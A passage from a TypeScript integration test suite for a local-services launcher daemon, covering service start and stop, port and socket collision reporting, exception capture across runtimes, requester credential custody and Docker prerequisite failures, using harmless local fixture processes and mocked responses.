        await once(occupant.stdout!, 'data');
        await writeFile(join(f.root, '.happier/project.json'), JSON.stringify(ProjectManifestV1Schema.parse({
            ...f.manifest, services: { worker: { ...f.manifest.services!.worker, port: address.port } },
        })));
        const executor = await f.createRuntimeActionExecutor();
        const action = (input: unknown) => executor({ actionId: 'localServices.launcher.start', input,
            context: { ...f.context, actionRequestId: 'occupied-port-start-replay' } });
        const review = await f.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Missing service review');
        const result = DaemonLocalServiceLauncherStartResponseV1Schema.parse(await action({
            ...f.request, expectedEffectDigest: review.reviewedEffectDigest,
        }));
        assertActionOutputContract('localServices.launcher.start', result);
        expect(result).toMatchObject({ status: 'failed', reasonCode: 'project_service_start_unavailable',
            failureCause: { phase: 'managed_service.establishment', errorCode: expect.any(String) },
            establishmentFailure: { cause: 'port_in_use', port: address.port, sameProject: true, exitCode: 1,
                lastStderrLine: `Error: listen EADDRINUSE: address already in use 127.0.0.1:${address.port}` } });
        expect(f.owner.listProjectServices().map(handle => handle.snapshot())).toEqual([
            expect.objectContaining({ state: 'failed', diagnostics: expect.arrayContaining([
                expect.objectContaining({ message: expect.stringContaining('EADDRINUSE') }),
            ]) }),
        ]);
        expect(f.operationRuntime.store.list({ accountId: 'owner', machineId: f.targetWorkspace.machineId }).items
            .find(item => item.actionId === 'localServices.launcher.start')).toMatchObject({ state: 'failed',
                error: { errorCode: 'project_service_start_unavailable',
                    failureCause: result.failureCause,
                    details: { establishmentFailure: result.establishmentFailure } } });
        const replay = DaemonLocalServiceLauncherStartResponseV1Schema.parse(await action({
            ...f.request, expectedEffectDigest: review.reviewedEffectDigest,
        }));
        assertActionOutputContract('localServices.launcher.start', replay);
        expect(replay).toMatchObject({ status: result.status, reasonCode: result.reasonCode,
            failureCause: result.failureCause, establishmentFailure: result.establishmentFailure });
        expect(occupant.exitCode).toBeNull();
    });

    it.skipIf(process.platform === 'win32')('retains a real Unix-socket collision without blaming the declared TCP port', async () => withSocketTempDir(async socketRoot => {
        const tcp = createServer();
        await new Promise<void>(resolve => tcp.listen(0, '127.0.0.1', resolve));
        const address = tcp.address();
        if (!address || typeof address === 'string') throw new Error('Missing fixture TCP port');
        await new Promise<void>((resolve, reject) => tcp.close(error => error ? reject(error) : resolve()));
        const f = await fixture();
        const socketPath = join(socketRoot, 'ipc.sock');
        const listener = createServer();
        await new Promise<void>(resolve => listener.listen(socketPath, resolve));
        cleanups.push(async () => { if (listener.listening) await new Promise<void>((resolve, reject) => listener.close(error => error ? reject(error) : resolve())); });
        const script = `require('net').createServer().listen(${JSON.stringify(socketPath)})`;
        await writeFile(join(f.root, '.happier/project.json'), JSON.stringify(ProjectManifestV1Schema.parse({
            ...f.manifest, services: { worker: { source: { kind: 'command', command: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(script)}` }, port: address.port } },
        })));
        const executor = await f.createRuntimeActionExecutor();
        const action = (input: unknown) => executor({ actionId: 'localServices.launcher.start', input, context: f.context });
        const review = await f.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Missing Unix-socket service review');
        const result = DaemonLocalServiceLauncherStartResponseV1Schema.parse(await action({ ...f.request, expectedEffectDigest: review.reviewedEffectDigest }));
        assertActionOutputContract('localServices.launcher.start', result);
        expect(result).toMatchObject({ status: 'failed', reasonCode: 'plugin_managed_service_establishment_failed',
            establishmentFailure: { cause: 'process_exited', exitCode: 1, lastStderrLine: expect.stringContaining('EADDRINUSE') } });
        expect(result.establishmentFailure).not.toHaveProperty('port');
        expect(result.establishmentFailure).not.toHaveProperty('sameProject');
        expect(listener.listening).toBe(true);
        expect(f.owner.listProjectServices().map(handle => handle.snapshot())).toEqual([
            expect.objectContaining({ state: 'failed', diagnostics: expect.arrayContaining([
                expect.objectContaining({ message: expect.stringContaining('EADDRINUSE') }),
            ]) }),
        ]);
    }));

    for (const [_runtime, executable, args, expected] of [
        ['node', process.execPath, ['-e', "throw new Error('FX51 establishment failed')"], 'Error: FX51 establishment failed'],
        ['python', process.platform === 'win32' ? 'python' : 'python3', ['-c', "import sys, traceback; traceback.print_exception(RuntimeError('FX51 establishment failed')); traceback.print_stack(); sys.exit(1)"], 'RuntimeError: FX51 establishment failed'],
        ['go', 'go', ['run', 'fx51.go'], 'panic: FX51 establishment failed'],
        ['ruby', 'ruby', ['-e', "def fail_sample; raise 'FX51 establishment failed'; end; fail_sample"], 'FX51 establishment failed (RuntimeError)'],
    ] as const) {
        // Optional installed runtimes add real qualification; Node/Python are required in this composed lane.
        const probe = _runtime === 'go' || _runtime === 'ruby'
            ? spawnSync(executable, _runtime === 'go' ? ['version'] : ['--version']) : undefined;
        const notInstalled = probe?.error && 'code' in probe.error && probe.error.code === 'ENOENT';
        it.skipIf(Boolean(notInstalled))(`retains the meaningful real ${_runtime} exception through declaration Start and its strict consumer`, async () => {
            const reservation = createServer();
            await new Promise<void>(resolve => reservation.listen(0, '127.0.0.1', resolve));
            const address = reservation.address();
            if (!address || typeof address === 'string') throw new Error('Missing fixture port');
            await new Promise<void>((resolve, reject) => reservation.close(error => error ? reject(error) : resolve()));
            const f = await fixture(false, { kind: 'command', command: [executable, ...args].map(value => JSON.stringify(value)).join(' ') });
            if (_runtime === 'go') {
                // This harness deliberately starts from an empty host environment.
                // Go's required build cache belongs to the fixture, not the developer's home.
                Object.assign(f.runtime.hostEnvironment, { GOCACHE: join(f.root, 'go-cache') });
                await writeFile(join(f.root, 'fx51.go'), 'package main\nfunc main() { panic("FX51 establishment failed") }\n');
            }
            await writeFile(join(f.root, '.happier/project.json'), JSON.stringify(ProjectManifestV1Schema.parse({
                ...f.manifest, services: { worker: { ...f.manifest.services!.worker, port: address.port } },
            })));
            const executor = await f.createRuntimeActionExecutor();
            const action = (input: unknown) => executor({ actionId: 'localServices.launcher.start', input,
                context: f.context });
            const review = await f.selectStart();
            if (!review.reviewedEffectDigest) throw new Error('Missing service review');
            const result = DaemonLocalServiceLauncherStartResponseV1Schema.parse(await action({
                ...f.request, expectedEffectDigest: review.reviewedEffectDigest,
            }));
            assertActionOutputContract('localServices.launcher.start', result);
            expect(result).toMatchObject({ status: 'failed', reasonCode: 'plugin_managed_service_establishment_failed',
                establishmentFailure: { cause: 'process_exited', exitCode: 1,
                    lastStderrLine: _runtime === 'ruby' ? expect.stringContaining(expected) : expected } });
            expect(f.owner.listProjectServices().map(handle => handle.snapshot())).toEqual([
                expect.objectContaining({ state: 'failed', diagnostics: expect.arrayContaining([
                    expect.objectContaining({ message: expect.stringContaining(expected) }),
                ]) }),
            ]);
        });
    }

    it.each(['ordinary', 'long_unicode'] as const)('emits registered launcher/Start/Stop outputs from real declaration discovery and supervision (%s)', async kind => {
        const script = `setInterval(() => {}, 1000); /* ${kind === 'long_unicode' ? '界🚀'.repeat(700) : 'service'} */`;
        const f = await fixture(false, { kind: 'command', command: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(script)}` });
        const snapshot = await f.routes.getSnapshot();
        assertActionOutputContract('localServices.launcher.snapshot', snapshot);
        expect(snapshot.targets).toHaveLength(1);
        const review = await f.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        if (!review.reviewedEffectDigest) throw new Error('Service review has no effect digest');
        const started = await f.routes.startTarget!({ ...f.request, expectedEffectDigest: review.reviewedEffectDigest }, f.ingress, f.context);
        assertActionOutputContract('localServices.launcher.start', started);
        expect(started.status).toBe('succeeded');
        if (!started.currentTarget) throw new Error('Service Start has no actual target');
        const routes = createLocalServiceActionRoutes({ machineId: 'machine',
            inventoryRegistry: createLocalServiceInventoryRegistry(), projectManagedServices: f.owner,
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const stop = { requestId: 'contract-stop', action: 'stop_managed' as const, target: started.currentTarget, force: false };
        const stopped = await routes.execute({ ...stop, confirmationNonce: createLocalServiceActionConfirmationNonceV1(stop) });
        assertActionOutputContract('localServices.actions.stopManaged', stopped);
        expect(stopped.status).toBe('succeeded');
        assertActionOutputContract('localServices.launcher.snapshot', await f.routes.getSnapshot());
    });

    it.each([false, true])('reuses the original reviewed service Start after Stop, with changed definition=%s', async changed => {
        const f = await fixture();
        const review = await f.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        if (!review.reviewedEffectDigest) throw new Error('Original Start review did not produce a digest');
        const original = { ...f.request, expectedEffectDigest: review.reviewedEffectDigest };
        expect(await f.routes.startTarget!(original, f.ingress, f.context)).toMatchObject({ status: 'succeeded' });
        const target = f.owner.readResourceTargets()[0];
        if (!target) throw new Error('Started service root is unavailable');
        const adapters = createProcessActionOwnerAdapters({ readServiceTargets: () => f.owner.readResourceTargets(),
            startService: f.routes.startTarget });
        const census = await readProcessCensus({ freshness: 'fresh', pids: [target.root.pid] });
        if (census.status !== 'ok') throw new Error('Native service identity unavailable');
        const native = census.rows.find(row => row.pid === target.root.pid);
        if (!native) throw new Error('Native service root unavailable');
        const root = listHappierProcessRoots({ snapshot: census,
            managedServices: [{ ...adapters.captureServiceRoot(target), start: native.start }] })
            .find(root => root.owner.kind === 'service');
        if (!root) throw new Error('Service root did not join its native generation');
        await adapters.stopOwner(root, {});
        expect(f.owner.readResourceTargets()).toEqual([]);
        if (changed) await writeFile(join(f.root, '.happier/project.json'), JSON.stringify({ ...f.manifest,
            services: { worker: { source: { kind: 'command', command: `${JSON.stringify(process.execPath)} -e "setInterval(() => {}, 2000)"` } } },
        }));
        const result = await adapters.startOwner(root, {
            rpcContext: { ...f.ingress, transportRequestId: 'process-start-again' },
            actionContext: { ...f.context, actionRequestId: 'process-start-again' },
        });
        if (changed) expect(result).toMatchObject({ status: 'refused', reasonCode: 'project_service_effect_changed',
            serviceStart: { request: original, response: { protocolVersion: 1, machineId: original.machineId, targetId: original.targetId,
                status: 'denied', reasonCode: 'project_service_effect_changed', reviewedEffect: expect.anything(), reviewedEffectDigest: expect.any(String) } },
        });
        else expect(result).toEqual({ status: 'started' });
        expect(MachineProcessesStartAgainResultV1Schema.safeParse(result).success).toBe(true);
        expect(f.owner.listProjectServices()).toHaveLength(changed ? 0 : 1);
    });

    it('reviews portable Home worker Services through the real source/preparation ports without widening binding or custody', async () => {
        const home = await mkdtemp(join(tmpdir(), 'service-portable-home-'));
        cleanups.push(() => rm(home, { recursive: true, force: true }));
        const scope = createEnvKeyScope(['HAPPIER_HOME_DIR', 'HAPPIER_ACTIVE_SERVER_ID']);
        const profileId = 'service-local-profile'; const homeId = 'srv_serviceHome';
        try {
            scope.patch({ HAPPIER_HOME_DIR: home, HAPPIER_ACTIVE_SERVER_ID: profileId }); reloadConfiguration();
            const url = 'https://home.example';
            const profile = { id: profileId, name: 'Service', serverUrl: url, webappUrl: url, createdAt: 1, updatedAt: 1, lastUsedAt: 1,
                homeConnectionDescriptorAuthority: 'exact' as const, homeConnectionDescriptor: HomeConnectionDescriptorV1Schema.parse({ v: 1,
                    homeServerIdentityId: homeId, canonicalServerUrl: url, revision: 1, endpoints: [{ kind: 'https', url }] }) };
            await updateSettings(settings => ({ ...settings, activeServerId: profileId, servers: { [profileId]: profile } }));
            const h = await fixture(false, undefined, true, 'portable', profileId, homeId);
            expect(await h.selectStart()).toMatchObject({ reviewedEffectDigest: expect.any(String) });
            expect(h.runtime.serverId).toBe(profileId);
            for (const scenario of ['wrong', 'ambiguous', 'retired'] as const) {
                const servers: Record<string, typeof profile> = scenario === 'ambiguous'
                    ? { [profileId]: profile, duplicate: { ...profile, id: 'duplicate' } } : scenario === 'retired' ? {} : { [profileId]: profile };
                await updateSettings(settings => ({ ...settings, servers }));
                expect(await h.routes.startTarget!({ ...h.request, workspace: { ...h.request.workspace,
                    serverId: scenario === 'wrong' ? 'wrong-home' : homeId } }, h.ingress, h.context))
                    .toMatchObject({ status: 'denied', reasonCode: 'target_mismatch' });
            }
            expect(h.copies()).toBe(0); expect(h.owner.listProjectServices()).toEqual([]);
        } finally { scope.restore(); reloadConfiguration(); }
    });

    it.each(['current', 'retired', 'cancelled during Project Home read'] as const)('reviews a Service with real admitted requester custody (%s)', async state => {
        const h = await fixture();
        const channel = await createRequesterCurrentnessSocketHarness();
        cleanups.push(() => channel.close());
        const cancellation = new AbortController();
        let cancelDuringProjectRead = false;
        const authorization = ExternalActionExecutionAuthorizationV1Schema.parse({ v: 1, token: 'home-proof', binding: {
            accountId: 'bob', principalId: 'bob', credentialId: 'pat', custodianAccountId: 'owner', accountEncryptionMode: 'plain',
            serverIdentityId: 'stable-home', machineId: 'machine', installationId: 'installation', actionId: 'localServices.launcher.start',
            requestId: 'service-request', requestEnvelopeDigest: 'a'.repeat(43), target: { kind: 'machine', machineId: 'machine' },
            grant: { v: 1, actions: { families: [], ids: ['localServices.launcher.start'] }, targets: { sessions: [], machines: ['machine'] },
                approve: false, origins: [], models: null, permissionModes: null, create: null },
        } });
        vi.mocked(axios.get).mockImplementation(async url => {
            if (String(url).endsWith('/v1/account/profile')) return { status: 200, data: { id: 'bob' } };
            if (String(url).endsWith('/v2/account/settings')) return { status: 200, data: { content: { t: 'plain', v: {} }, version: 1 } };
            return { status: 200, data: { mode: 'plain', version: 1, signingKeyFingerprint: null, contentKeyFingerprint: null, updatedAt: 1 } };
        });
        const admitted = await admitRequesterAccountActionContext({ authorization, credentials: { token: 'bob', encryption: null },
            serverId: 'home', serverIdentityId: 'stable-home', serverHttpBaseUrl: 'https://home.example', isCurrent: async () => true,
            signal: cancellation.signal });
        if (!admitted) throw new Error('Requester custody not admitted');
        cleanups.push(() => admitted.dispose());
        const rowPost = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            if (String(url).endsWith('/verify')) {
                return { status: 200, data: { ok: true } };
            }
            const response = await rowPost(url, body, options);
            if (cancelDuringProjectRead && String(url).endsWith(`${PROJECT_ACCOUNT_ROWS_ROUTE_V1}/read`)) cancellation.abort();
            return response;
        });
        const carrier = await projectExternalActionRequesterHttpAuthorization({ authorization: admitted.authorization,
            serverId: 'home', serverIdentityId: 'stable-home', serverHttpBaseUrl: 'https://home.example', target: authorization.binding.target,
            installationId: 'installation', privateKey: nacl.sign.keyPair().secretKey, isCurrent: admitted.isCurrent });
        if (!carrier) throw new Error('Requester HTTP custody not admitted');
        // This replaces constructor state, not admission or native review logic.
        Reflect.deleteProperty(h.runtime, 'credentials');
        Object.assign(h.runtime, { accountId: 'bob', accountAuthorization: carrier, isCurrent: admitted.isCurrent });
        const ingress = { ...h.ingress, signal: cancellation.signal, callerInputAuthorization: carrier, callerInputConstraints: { models: null, permissionModes: null },
            machineAdmission: { ...h.ingress.machineAdmission!, actorAccountId: 'bob' } };
        if (state === 'retired') await admitted.dispose();
        cancelDuringProjectRead = state === 'cancelled during Project Home read';
        if (state !== 'current') {
            const review = await h.routes.startTarget!(h.request, ingress, h.context);
            assertActionOutputContract('localServices.launcher.start', review);
            expect(review).toMatchObject({ status: 'denied', reasonCode: state === 'retired'
                ? 'project_requester_credentials_unavailable' : 'cancelled' });
            expect(cancellation.signal.aborted).toBe(state === 'cancelled during Project Home read');
            expect(h.owner.listProjectServices()).toEqual([]);
            await admitted.dispose();
            return;
        }
        ingress.machineAdmission.role = 'use';
        const minimalRequest = { machineId: h.request.machineId, targetId: h.request.targetId, workspaceId: h.workspace.id };
        await seedWorkerService(h, h.workspace, h.request.targetId);
        const foreignHandle = h.owner.listProjectServices()[0]!;
        expect(await h.routes.prepareStartApproval!(minimalRequest, ingress, h.context))
            .toEqual({ ok: false, errorCode: 'launcher_start_declaration_unavailable', error: 'launcher_start_declaration_unavailable',
                failureCause: { phase: 'service.launch.supervision', errorClass: 'Error', errorCode: 'launcher_start_declaration_unavailable', httpStatus: null } });
        expect(await h.routes.startTarget!(minimalRequest, ingress, h.context))
            .toMatchObject({ status: 'denied', reasonCode: 'launcher_start_declaration_unavailable', snapshot: { targets: [] } });
        const { serverId: _serverId, ...missingHomeContext } = h.context;
        expect(await h.routes.prepareStartApproval!({ ...minimalRequest, workspace: h.request.workspace }, ingress, missingHomeContext))
            .toEqual({ ok: false, errorCode: 'requester_credentials_unavailable', error: 'requester_credentials_unavailable' });
        expect(await h.routes.startTarget!(minimalRequest, ingress, missingHomeContext))
            .toMatchObject({ status: 'denied', reasonCode: 'requester_credentials_unavailable', snapshot: { targets: [] } });
        await foreignHandle.dispose();
        await seedWorkerService(h, { ...h.workspace, id: 'foreign-workspace' });
        const review = await h.selectStart(ingress);
        expect(cancellation.signal.aborted).toBe(false);
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, ingress, h.context);
        expect(started).toMatchObject({ status: 'succeeded' });
        expect(started.snapshot.targets.map(target => target.id)).toEqual([h.request.targetId]);
        const handle = h.owner.listProjectServices().find(candidate => candidate.requester.accountId === 'bob')!;
        if (handle.kind !== 'workspace') throw new Error('Expected workspace Service');
        expect(handle.requester.accountId).toBe('bob');
        expect(await h.routes.prepareStartApproval!(minimalRequest, ingress, h.context))
            .toMatchObject({ request: { ...minimalRequest, workspace: h.request.workspace, declaration: h.request.declaration } });
        await admitted.dispose();
        // Installed requester invocation retirement does not revoke custody of its already-running Service.
        expect(handle.isCurrent()).toBe(true);
        await handle.stop();
    });

    it('reviews fresh accepted bytes, starts a URL-less owned process through final Exec, and retains exact requester custody', async () => {
        const h = await fixture();
        const review = await h.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        if (!review.reviewedEffectDigest) throw new Error('Expected reviewed effect');
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        h.history.dismiss(request.targetId);
        expect((await h.routes.getSnapshot()).targets).toEqual([]);
        const result = await h.routes.startTarget!(request, h.ingress, h.context);
        expect(result).toMatchObject({ status: 'succeeded', snapshot: { machineId: 'machine', targets: [expect.objectContaining({ serviceState: 'running' })] } });
        expect(h.history.isDismissed(request.targetId)).toBe(false);
        const handle = h.owner.listProjectServices()[0];
        expect(result).toMatchObject({ currentTarget: { kind: 'managed_service', managedServiceId: handle?.instanceId,
            machineId: 'machine', workspaceId: h.workspace.id, cwd: h.root, declaration: h.request.declaration } });
        expect(handle).toMatchObject({ workspace: { id: 'accepted', serverId: 'home' }, declaration: h.request.declaration,
            requester: { serverId: 'home', accountId: 'owner', machineId: 'machine', installationId: 'installation' } });
        expect(handle?.instanceId).toEqual(expect.any(String));
        expect(handle?.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        expect(result.snapshot?.targets[0]).toMatchObject({
            startedAtMs: handle?.snapshot().startedAtMs,
            startedByAccountId: 'owner',
            endpointKind: 'none',
        });
        h.retireRegistryProjection();
        expect(handle?.isCurrent()).toBe(true);
        expect(h.owner.listProjectServices()).toEqual([handle]);
        await handle?.stop();
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('publishes a portless declaration HTTP endpoint only after owned-tree observation', async () => {
        const h = await fixture();
        // The real listener and OS census prove ancestry; no PID, port or lineage is invented.
        const portPath = join(h.root, 'observed-port');
        const serverPath = join(h.root, 'server.cjs');
        await writeFile(serverPath, `const http = require('node:http'); const fs = require('node:fs');
const server = http.createServer((request, response) => response.end('observed'));
server.listen(0, '127.0.0.1', () => fs.writeFileSync(${JSON.stringify(portPath)}, String(server.address().port)));`);
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest,
            services: { worker: { source: { kind: 'command', command: `${JSON.stringify(process.execPath)} ${JSON.stringify(serverPath)}` } } } }));
        const review = await h.selectStart();
        const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        expect(started.status).toBe('succeeded');
        await expect.poll(() => readFile(portPath, 'utf8').then(Number).catch(() => null), { timeout: 10_000 }).toEqual(expect.any(Number));
        const port = Number(await readFile(portPath, 'utf8'));
        const handle = h.owner.listProjectServices()[0];
        if (!handle) throw new Error('Expected the started Service owner');
        const endpointUrl = `http://127.0.0.1:${port}`;
        let observeEndpoint!: () => void;
        const endpointObserved = new Promise<void>(resolve => { observeEndpoint = resolve; });
        const checkEndpoint = () => { if (handle.snapshot().baseUrl === endpointUrl) observeEndpoint(); };
        const observation = handle.observe(checkEndpoint);
        onTestFinished(() => observation.dispose());
        checkEndpoint();
        await endpointObserved;
        const target = (await h.routes.getSnapshot()).targets.find(target => target.source === 'managed_service');
        expect(target).toMatchObject({ endpointUrl, serviceState: 'running', endpointKind: 'http', startedByAccountId: 'owner' });
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('reads complete current managed bindings independently of launcher Hide and distinguishes owned empty', async () => {
        const h = await fixture();
        const read = { workspaceRoot: h.root, projection: 'managed_bindings' as const };
        const rpc = new RpcHandlerManager({ scopePrefix: 'machine', localMachineId: 'machine', encryptionMode: 'plain' });
        registerDaemonLocalServicesMachineRpcHandlers(rpc, { machineId: 'machine', serverId: 'home', localServicesLauncher: h.routes });
        const getBindings = async () => DaemonLocalServiceLauncherSnapshotResponseV1Schema.parse(await rpc.invokeLocal(
            RPC_METHODS.DAEMON_LOCAL_SERVICES_LAUNCHER_SNAPSHOT, { machineId: 'machine', ...read }, { signal: h.ingress.signal, localActionContext: h.context })).snapshot;
        expect((await getBindings()).targets).toEqual([]);
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected Service review');
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        const handle = h.owner.listProjectServices()[0]!;
        h.history.dismiss(handle.serviceId);
        expect((await h.routes.getSnapshot()).targets).toEqual([]);
        expect((await getBindings()).targets).toEqual([expect.objectContaining({
            source: 'managed_service', sourceClass: { kind: 'managed_service', managedServiceId: handle.instanceId },
            workspace: h.request.workspace, declaration: h.request.declaration, serviceState: 'running',
        })]);
        await handle.stop();
        expect((await getBindings()).targets).toEqual([]);
    });

    it.each([
        ['linux', 'permission_denied', 'permission denied while trying to connect to the docker API at unix:///var/run/docker.sock'],
        ['darwin', 'not_running', 'Cannot connect to the Docker daemon at unix:///Users/alice/.docker/run/docker.sock. Is the docker daemon running?'],
        ['win32', 'not_running', 'open //./pipe/dockerDesktopLinuxEngine: The system cannot find the file specified.'],
        ['win32', 'permission_denied', 'open //./pipe/docker_engine: Access is denied.'],
        ['linux', 'unavailable', 'Docker endpoint TLS handshake failed'],
    ] as const)('refuses unavailable Docker before admitting a native resource (%s %s)', async (platform, cause, stderr) => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        h.setNativeTool({ executablePath: '/installed/docker' });
        Object.assign(h.runtime, { platform });
        // Only Docker process IO is replaced. Admission, declaration discovery,
        // Action/launcher wiring, strict output schema and row projection stay real.
        const observed: string[][] = [];
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, async run(request: Parameters<ProjectFiniteActionRuntime['environmentIo']['run']>[0]) {
            observed.push([...request.args]);
            return { exitCode: 1, stdout: '', stderr };
        } } });
        const execute = await h.createRuntimeActionExecutor();
        const raw = await execute({
            actionId: 'localServices.launcher.start', input: h.request, context: h.context,
        });
        expect(raw).toMatchObject({ status: 'denied', reasonCode: 'native_tool_unavailable' });
        const result = DaemonLocalServiceLauncherStartResponseV1Schema.parse(raw);
        assertActionOutputContract('localServices.launcher.start', result);
        expect(result).toMatchObject({ status: 'denied', reasonCode: 'native_tool_unavailable',
            prerequisite: { tool: 'docker', cause, machineName: expect.any(String) } });
        const approval = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        expect(approval).toMatchObject({ ok: false, errorCode: 'native_tool_unavailable',
            failureCause: result.failureCause,
            details: { prerequisite: result.prerequisite } });
        expect(observed.length).toBeGreaterThan(0);
        expect(observed.some(args => args.includes('up') || args.includes('stop'))).toBe(false);
        expect(h.owner.listProjectServices()).toEqual([]);
        const snapshot = await h.routes.getSnapshot();
        assertActionOutputContract('localServices.launcher.snapshot', snapshot);
        expect(snapshot.targets).toHaveLength(1);
        const rows = buildLocalServiceRows({ inventoryRows: [], launchTargets: snapshot.targets, sessionId: null, scope: 'workspace' });
        expect(rows[0]).toMatchObject({ status: 'stopped', primaryAction: { kind: 'start' } });
    });

    it('projects a missing Docker installation as a native prerequisite without acquiring custody', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        const result = await h.routes.startTarget!(h.request, h.ingress, h.context);
        assertActionOutputContract('localServices.launcher.start', result);
        expect(result).toMatchObject({ status: 'denied', reasonCode: 'native_tool_unavailable',
            prerequisite: { tool: 'docker', cause: 'not_installed', machineName: expect.any(String) } });
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('keeps cancelled Docker inspection distinct from a native prerequisite', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        h.setNativeTool({ executablePath: '/installed/docker' });
        const cancellation = new AbortController();
        Object.assign(h.ingress, { signal: cancellation.signal });
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, async run() {
            cancellation.abort();
            return { exitCode: 1, stdout: '', stderr: 'permission denied' };
        } } });
        const result = await h.routes.startTarget!(h.request, h.ingress, h.context);
        assertActionOutputContract('localServices.launcher.start', result);
        expect(result).toMatchObject({ status: 'denied', reasonCode: 'cancelled' });
        expect(result).not.toHaveProperty('prerequisite');
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.each([false, true])('composes Stop and reloaded row projection for an unknown Compose binding with captured identity=%s', async captured => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        h.setNativeTool({ executablePath: '/installed/docker' });
        let unavailable = false;
        let settled = false;
        let identitiesVisible = captured;
        let project = '';
        let nativeReads = 0;
        const id = 'a'.repeat(64);
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, async run(request: Parameters<ProjectFiniteActionRuntime['environmentIo']['run']>[0]) {
            nativeReads++;
            if (unavailable) return { exitCode: 1, stdout: '', stderr: 'permission denied while trying to connect to the docker API at unix:///var/run/docker.sock' };
            if (request.args.includes('info')) return { exitCode: 0, stdout: JSON.stringify({ ID: 'test-compose-engine', OperatingSystem: 'Linux' }) };
            const filter = request.args.find(arg => arg.startsWith('label=com.docker.compose.project='));
            if (filter) project = filter.slice('label=com.docker.compose.project='.length);
            const stdout = request.args.includes('ps') ? identitiesVisible ? id : 'invalid-container-list'
                : request.args.includes('inspect') ? JSON.stringify([{ Id: id,
                    Config: { Labels: { 'com.docker.compose.project': project, 'com.docker.compose.service': 'worker' } },
                    State: { Status: settled ? 'exited' : 'running' }, NetworkSettings: { Ports: {} } }]) : '';
            return { exitCode: 0, stdout };
        } } });
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error(`Expected Compose effect review: ${JSON.stringify(review)}`);
        const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        expect(started).toMatchObject({ status: 'succeeded' });
        if (!started.currentTarget) throw new Error('Expected real managed Compose binding');
        const handle = h.owner.listProjectServices()[0];
        if (!handle) throw new Error('Expected the launched Workspace service');
        expect(handle).toMatchObject({ declaration: { selection: { kind: 'manifest', name: 'worker' } } });
        const machineRow = h.owner.machineServiceRows.read(handle);
        const readsBeforeIdentity = nativeReads;
        const adapter = { pluginId: 'happier.machine.services', localId: 'compose' };
        for (const tuple of [['test-compose-engine', project], ['test-compose-engine', project, 'worker']]) {
            expect(h.owner.resolveNativeService({ adapter, nativeResourceId: JSON.stringify(tuple) },
                { serverId: 'home', machineId: 'machine' })).toMatchObject({ authority: 'project', serviceId: handle.serviceId, handle });
        }
        expect(h.owner.resolveNativeService({ adapter, nativeResourceId: JSON.stringify(['other-engine', project]) },
            { serverId: 'home', machineId: 'machine' })).toBeNull();
        expect(nativeReads).toBe(readsBeforeIdentity);
        unavailable = true;
        const routes = createLocalServiceActionRoutes({ machineId: 'machine',
            inventoryRegistry: createLocalServiceInventoryRegistry(), projectManagedServices: h.owner,
            verifyConfirmationNonce: request => request.confirmationNonce === createLocalServiceActionConfirmationNonceV1(request) });
        const stop = { requestId: 'docker-unknown-stop', action: 'stop_managed' as const, target: started.currentTarget, force: false };
        try {
            const result = await routes.execute({ ...stop, confirmationNonce: createLocalServiceActionConfirmationNonceV1(stop) });
            assertActionOutputContract('localServices.actions.stopManaged', result);
            expect(result).toMatchObject({ status: 'failed', reasonCode: 'plugin_managed_server_termination_incomplete' });
            const snapshot = await h.routes.getSnapshot();
            assertActionOutputContract('localServices.launcher.snapshot', snapshot);
            const rows = buildLocalServiceRows({ inventoryRows: [], launchTargets: snapshot.targets, sessionId: null, scope: 'workspace' });
            expect(rows).toHaveLength(1);
            expect(rows[0]).toMatchObject({ status: 'unavailable' });
            expect(h.owner.listProjectServices()).toHaveLength(1);
            unavailable = false; identitiesVisible = true; settled = true;
            const recovered = await routes.execute({ ...stop, confirmationNonce: createLocalServiceActionConfirmationNonceV1(stop) });
            assertActionOutputContract('localServices.actions.stopManaged', recovered);
            expect(recovered).toMatchObject({ status: 'succeeded' });
            expect(h.owner.listProjectServices()).toHaveLength(0);
            expect(machineRow.native?.displayName,
                'manifest Compose services present their admitted declaration name').toBe('worker');
